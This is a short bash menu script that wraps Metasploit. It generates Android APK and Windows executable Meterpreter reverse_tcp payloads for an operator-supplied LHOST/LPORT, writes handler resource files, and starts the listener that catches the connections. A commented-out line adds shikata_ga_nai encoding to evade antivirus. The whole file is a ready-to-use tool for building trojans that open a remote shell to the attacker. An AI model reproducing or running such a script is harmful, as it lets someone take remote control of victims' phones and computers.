#! /bin/bash

echo "1 = msf payload for android"
echo "2 = msf payload for windows"
echo "3 = start msf-listener"
echo "4 = exit"


fu1() {
read -p "Enter LHOST : " host
read -p "Enter LPORT : " port
read -p "Enter PORT on your PC : " pc
read -p "Enter a Name for apk : " name
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > $name.apk
echo " use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $host
set LPORT $pc
exploit" >> $name.rc
./msf.sh 
}



fu2() {
read -p "Enter LHOST : " host
read -p "Enter LPORT : " port
read -p "Enter PORT on your PC : " pc
read -p "Enter FileFormat : " format
read -p "Enter a Name for payload : " name
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f $format -o $name.exe

#msfvenom -p windows/x64/meterpreter_reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=$host LPORT=$port -f $format -o $name.txt
echo " use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $host
set LPORT $pc
exploit" >> $name.rc

./msf.sh 
}


fu3() {
read -p "Enter a Name of payload without extension : " name
msfconsole -r $name.rc
}


fu4() { exit; }

read -p "Enter a Number : " num

if [[ $num = [1234] ]]; then # validate input
  fu"$num"
fi